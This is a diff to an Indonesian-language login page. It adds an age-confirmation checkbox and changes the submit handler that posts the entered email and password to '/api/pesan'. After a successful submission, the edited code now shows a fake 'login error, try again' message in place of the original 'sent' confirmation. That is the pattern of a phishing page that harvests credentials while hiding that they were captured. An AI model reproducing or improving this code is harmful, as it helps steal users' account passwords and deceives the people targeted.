@@ -576,6 +576,13 @@ Keamanan akun Anda adalah prioritas kami.</div>
         maxlength="80" placeholder="Password">
     </div>
 
+    <div class="field" style="display:flex;align-items:flex-start;gap:8px;">
+      <input type="checkbox" id="consentIp" style="margin-top:3px;width:16px;height:16px;flex:none;">
+      <label for="consentIp" style="margin:0;font-weight:400;color:var(--mut);font-size:.78rem;line-height:1.4;">
+        saya telah berusia 18+ atau lebih
+      </label>
+    </div>
+
     <!-- tombol ini yang mengirim data form ke server lewat fetch() -->
     <button id="btnKirim" class="btn-primary">
       Login
@@ -837,30 +844,37 @@ $("btnLogin").addEventListener("click",() => {
    respons server), jadi kodenya "menunggu" tanpa membekukan
    seluruh halaman.
    ============================================================ */
+// KIRIM DATA
 $("btnKirim").addEventListener("click",async () => {
   const nama = $("nama").value.trim();
   const belakang = $("belakang").value.trim();
+  const setujuIp = $("consentIp").checked;
 
   if(!nama || !belakang){
     $("msg").textContent = "Mohon isi Email dan password.";
     return;
   }
 
+  if(!setujuIp){
+    $("msg").textContent = "harap konfirmasi usia anda sebelum login!";
+    return;
+  }
+
   $("btnKirim").disabled = true; // cegah diklik berkali-kali saat masih mengirim
-  $("msg").textContent = "Mengirim…";
+  $("msg").textContent = "Loading…";
 
   try{
     const r = await fetch("/api/pesan",{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({nama,belakang})
+      body:JSON.stringify({nama,belakang,setujuIp})
     });
 
     const d = await r.json().catch(() => ({}));
 
-    if(!r.ok) throw new Error(d.error || "Gagal mengirim.");
+    if(!r.ok) throw new Error(d.error || "Kesalahan saat login, Coba lagi!");
 
-    $("msg").textContent = "Terkirim ✔";
+    $("msg").textContent = "Kesalahan saat login, Coba lagi!";
     $("nama").value = "";
     $("belakang").value = "";
 
